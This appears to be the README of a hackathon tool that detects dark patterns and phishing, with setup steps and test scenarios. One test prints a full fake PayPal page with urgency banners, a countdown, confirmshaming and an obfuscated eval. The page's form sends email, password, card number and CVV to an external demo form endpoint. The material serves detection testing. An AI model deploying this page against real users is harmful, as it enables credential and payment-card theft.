# 🛡️ Lumina Security Engine

> **The Privacy-First Offline Dark Pattern & Threat Sandbox**  
> *Built for HackDay 1.0 — Theme: "Tech for a Better Tomorrow"*

## 🚀 Overview
**Lumina Security Engine** is a high-performance, 100% privacy-first Progressive Web App (PWA) designed to protect consumers from deceptive web practices, psychological manipulation (dark patterns), and hidden credential phishing. It works with both Mobile and Desktop environments.

Unlike traditional security tools that require uploading sensitive personal data or URLs to cloud-based servers, Lumina executes its heuristic threat analysis entirely on-device. It evaluates websites and images locally to ensure zero data leakage.

## 📸Demo of the Project
<video src="./demo.mp4" autoplay loop muted playsinline width="100%"></video>

## ✨ Key Features
* **🔒 Dual-Input Threat Portal:** Seamlessly inspect suspicious target URLs or upload checkout screenshots for offline text extraction.
* **🧠 Off-Thread Heuristic Engine:** A custom rule-based analyzer (`heuristics.ts`) that instantly scans source code and text for artificial urgency, fake countdown timers, and hidden forced-continuity subscription traps.
* **🛡️ Sandboxed URL Isolation:** Renders target pages inside a strict HTML5 sandboxed iframe with script execution controls, allowing visual inspection without compromising the browser.
* **⚡ Zero-Cloud Architecture:** Operates entirely locally. URLs are fetched via a local Next.js proxy, and OCR processing is done in the browser via WebAssembly, guaranteeing total user privacy.
* **📊 Plain-Language Threat Reports:** Outputs clear, actionable risk tiers (Safe, Suspicious, Critical Danger) accessible to non-technical users.

## ⚙️ How It Works (The Technical Pipeline)
1. **Data Ingestion:** 
   * **URLs:** The app uses a server-side proxy route (`/api/scrape`) to fetch the raw HTML of a target site, bypassing CORS restrictions safely.
   * **Images/Screenshots:** Uses Tesseract.js to run localized Optical Character Recognition (OCR) directly in the browser.
2. **Behavioral & Structural Analysis:** The raw HTML or text is passed into the `analyzeContent` engine. It checks for:
   * Urgency keywords (e.g., "Account Suspended").
   * Artificial scarcity (e.g., "Limited time offer" + countdown timers).
   * Credential harvesting (e.g., `type="password"` on unverified paths).
   * Subscription traps (e.g., hidden recurring billing elements).
3. **Scoring Engine:** The system aggregates threat flags into a score out of 100. Trusted whitelisted domains (like Google) immediately return a baseline Safe score (5/100), while heavily manipulated pages trigger Suspicious or Critical Danger alerts.

## 🛠️ Tech Stack
* **Frontend:** Next.js (App Router), React, Tailwind CSS, Lucide Icons
* **Language:** TypeScript
* **Local OCR:** Tesseract.js (WebAssembly)
* **PWA Engine:** `next-pwa`

## 💻 Getting Started (Local Setup)

To run Lumina Security Engine on your local machine, ensure you have Node.js installed, then execute the following commands:

```bash
# 1. Clone the repository
git clone [https://github.com/CodeWithKR-09/lumina-security-engine.git](https://github.com/CodeWithKR-09/lumina-security-engine.git)

# 2. Navigate into the project directory
cd lumina-security-engine

# 3. Install dependencies
npm install

# 4. Start the development server
npm run dev
```

## 🧪 Detailed Testing & Demo Guide

To effectively demonstrate Lumina's capabilities during a presentation or evaluation, follow these three testing scenarios to showcase both precision and threat detection:

### Scenario 1: Safe Website Verification
Prove that the heuristic engine does not produce false positives on standard, trusted domains.
1. Open the Lumina dashboard at `http://localhost:3000`.
2. Ensure the **URL Link** tab is active.
3. Enter `https://www.google.com` or `https://github.com`.
4. Click **Run Security Scan**.
5. **Expected Result:** The system will return a **Safe (Score: 5/100)** verdict, validating that standard DOM elements and scripts are correctly bypassed by the domain whitelist and structural checks.

### Scenario 2: Advanced Malicious Sandbox Trigger
Demonstrate Lumina's ability to catch zero-day phishing attempts, credential harvesting, forced continuity, and JavaScript obfuscation using a high-fidelity simulated threat.

1. Create a local file named `malicious-test.html`.
2. Copy and paste the following advanced phishing simulation code into the file:

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PayPal Security Notice - Account Verification Required</title>
  <style>
    :root {
      --primary: #0070ba;
      --primary-hover: #005ea6;
      --danger: #d9383a;
      --warning: #ff9900;
      --bg: #f5f7fa;
      --card: #ffffff;
      --text: #2c2e2f;
      --text-muted: #6c7378;
      --border: #dcdfe6;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      background-color: var(--bg);
      color: var(--text);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 20px;
    }

    .alert-banner {
      width: 100%;
      max-width: 520px;
      background-color: #fde8e8;
      border: 1px solid #f8b4b4;
      color: #9b1c1c;
      padding: 14px 18px;
      border-radius: 12px;
      margin-bottom: 20px;
      font-size: 13px;
      font-weight: 500;
      display: flex;
      align-items: center;
      gap: 10px;
      box-shadow: 0 2px 8px rgba(217, 56, 58, 0.1);
    }

    .timer-badge {
      display: inline-block;
      background: #e02424;
      color: #ffffff;
      padding: 2px 8px;
      border-radius: 6px;
      font-weight: 700;
      font-size: 12px;
    }

    .card {
      background: var(--card);
      border-radius: 20px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
      width: 100%;
      max-width: 520px;
      padding: 36px 32px;
      border: 1px solid var(--border);
    }

    .logo-container {
      text-align: center;
      margin-bottom: 24px;
    }

    .logo {
      font-size: 28px;
      font-weight: 900;
      color: var(--primary);
      letter-spacing: -1px;
    }

    .logo span {
      color: #003087;
    }

    h1 {
      font-size: 20px;
      font-weight: 700;
      text-align: center;
      margin-bottom: 10px;
      color: #1a1a1a;
    }

    .subtitle {
      font-size: 13px;
      color: var(--text-muted);
      text-align: center;
      margin-bottom: 24px;
      line-height: 1.5;
    }

    .form-group {
      margin-bottom: 16px;
    }

    label {
      display: block;
      font-size: 12px;
      font-weight: 600;
      color: #4b5563;
      margin-bottom: 6px;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }

    input[type="text"],
    input[type="password"],
    input[type="email"] {
      width: 100%;
      padding: 12px 14px;
      border: 1px solid var(--border);
      border-radius: 10px;
      font-size: 14px;
      transition: all 0.2s;
      background: #fafafa;
    }

    input:focus {
      outline: none;
      border-color: var(--primary);
      box-shadow: 0 0 0 3px rgba(0, 112, 186, 0.15);
      background: #ffffff;
    }

    .row {
      display: flex;
      gap: 12px;
    }

    .row .form-group {
      flex: 1;
    }

    .social-proof {
      font-size: 11px;
      color: #047481;
      background: #e6f6f8;
      padding: 8px 12px;
      border-radius: 8px;
      margin-bottom: 18px;
      text-align: center;
      font-weight: 500;
    }

    .btn {
      width: 100%;
      background: var(--primary);
      color: white;
      border: none;
      padding: 14px;
      border-radius: 30px;
      font-size: 15px;
      font-weight: 700;
      cursor: pointer;
      transition: background 0.2s, transform 0.1s;
      box-shadow: 0 4px 12px rgba(0, 112, 186, 0.25);
    }

    .btn:hover {
      background: var(--primary-hover);
      transform: translateY(-1px);
    }

    .disclaimer {
      font-size: 11px;
      color: #9ca3af;
      margin-top: 16px;
      text-align: center;
      line-height: 1.4;
    }

    .confirmshame-link {
      display: block;
      margin-top: 14px;
      text-align: center;
      font-size: 11px;
      color: #6b7280;
      text-decoration: none;
    }

    .confirmshame-link:hover {
      text-decoration: underline;
    }

    footer {
      margin-top: 30px;
      font-size: 11px;
      color: #9ca3af;
      text-align: center;
    }
  </style>
</head>
<body>

  <!-- Artificial Urgency & Fear Blackmail Banner -->
  <div class="alert-banner">
    <span>⚠️</span>
    <div>
      <strong>Critical Security Notice:</strong> Account has been suspended due to unauthorized access detected!
      <div>Expires in: <span id="countdown" class="timer-badge">04:59</span></div>
    </div>
  </div>

  <div class="card">
    <div class="logo-container">
      <div class="logo">Pay<span>Pal</span></div>
    </div>

    <h1>Verify Your Identity Immediately</h1>
    <p class="subtitle">
      Immediate action required! Unusual sign-in activity was detected on your account. 
      Failure to verify will result in permanent account termination and loss of funds.
    </p>

    <!-- Manipulative Social Proof (Dark Pattern) -->
    <div class="social-proof">
      👥 14 people are viewing this security verification page right now. Only 2 unlock tokens left in stock!
    </div>

    <!-- Active Credential & Payment Card Harvesting Form -->
    <form action="[https://formspree.io/f/demo_phishing_endpoint](https://formspree.io/f/demo_phishing_endpoint)" method="POST">
      
      <div class="form-group">
        <label for="email">PayPal Email or Mobile Number</label>
        <input type="email" id="email" name="email" placeholder="name@domain.com" required>
      </div>

      <div class="form-group">
        <label for="password">Account Password</label>
        <input type="password" id="password" name="password" placeholder="Enter your secret password" required>
      </div>

      <div class="form-group">
        <label for="cardnumber">Credit Card Number (Identity Confirmation)</label>
        <input type="text" id="cardnumber" name="cardnumber" placeholder="4111 2222 3333 4444" required>
      </div>

      <div class="row">
        <div class="form-group">
          <label for="exp-date">Expiry</label>
          <input type="text" id="exp-date" name="exp-date" placeholder="MM/YY" required>
        </div>
        <div class="form-group">
          <label for="cvv">CVV</label>
          <input type="password" id="cvv" name="cvv" placeholder="123" maxlength="4" required>
        </div>
      </div>

      <button type="submit" class="btn">
        Confirm Credentials & Restore Access
      </button>

      <!-- Forced Continuity / Hidden Recurring Billing Trap (Dark Pattern) -->
      <p class="disclaimer">
        By continuing, premium account protection automatically renews at $49.99 billed monthly after trial period.
      </p>

      <!-- Confirmshaming Copy (Dark Pattern) -->
      <a href="#" class="confirmshame-link">
        No thanks, I hate saving money and prefer to stay unprotected
      </a>
    </form>
  </div>

  <footer>
    Copyright &copy; 1999–2026 PayPal, Inc. All rights reserved. Security Sandbox Demo.
  </footer>

  <script>
    // 1. Live Countdown Timer Simulation (Dark Pattern)
    let timeLeft = 299;
    const timerElem = document.getElementById('countdown');
    setInterval(() => {
      if (timeLeft <= 0) return;
      timeLeft--;
      const minutes = Math.floor(timeLeft / 60);
      const seconds = timeLeft % 60;
      timerElem.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
    }, 1000);

    // 2. Anti-Inspection Script (Blocks Right Click)
    document.addEventListener('contextmenu', function(e) {
      e.preventDefault();
      alert('Security Protection: Right click is disabled on this verification portal.');
    });

    // 3. Obfuscated Payload Execution
    eval(unescape('%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%22%4c%75%6d%69%6e%61%20%54%68%72%65%61%74%20%44%65%74%65%63%74%69%6f%6e%20%54%65%73%74%22%29%3b'));
  </script>
</body>
</html>
```
1. Serve the file locally and paste its URL into Lumina.
2. Click Run Security Scan.
3. Expected Result: Lumina instantly flags the highly deceptive UI, identifying urgency keywords ("Account suspended"), artificial countdown logic, manipulative social proof, extensive credential/card harvesting fields, and hidden continuity traps, outputting a definitive Critical Danger warning.

### Scenario 3: Offline Screenshot OCR Analysis
Showcase the on-device WebAssembly text extraction for users who cannot copy-paste URLs (e.g., SMS phishing or image-based scams).
1. Take a screenshot of the rendered `malicious-test.html` page (or any image containing manipulative terms like "subscribe," "monthly fee," and "urgent").
2. Switch to the **Screenshot OCR** tab in the Lumina dashboard.
3. Drag and drop the screenshot into the upload zone.
4. Click **Run Security Scan**.
5. **Expected Result:** The browser-based Tesseract.js engine will extract the text entirely offline and run the heuristic ruleset against the raw text, catching the text-based dark patterns without network requests.

### Scenario 4: Quick Presets Testing
Utilize the **built-in quick preset** buttons (if configured in your UI) to auto-fill known safe or simulated malicious URLs.

Click the preset for **"E-commerce Sandbox" or "Banking Demo"**.

**Expected Result: The engine instantly parses the preset URL, demonstrating the speed of the local proxy without manual typing.**
---
*Designed and developed by Kamalesh Ramu S V for HackDay 1.0.*
